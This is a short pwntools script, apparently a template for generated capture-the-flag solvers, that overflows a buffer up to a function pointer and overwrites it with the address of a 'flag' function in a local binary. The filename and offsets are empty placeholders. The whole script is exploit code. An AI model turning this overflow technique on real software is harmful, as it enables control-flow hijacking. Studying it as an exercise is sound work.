from pwn import *

gen_filename = ""
gen_names = {}
gen_var_locations = {}

e = ELF(gen_filename)
p = e.process()
p.readline()

buff = gen_names["buffer"]
fp = gen_names["fp"]

payload = b""
payload += (gen_var_locations[fp][-1] - gen_var_locations[buff][-1]) * b"a"
payload += p32(e.symbols["flag"])
p.sendline(payload)

print(p.readlineS())
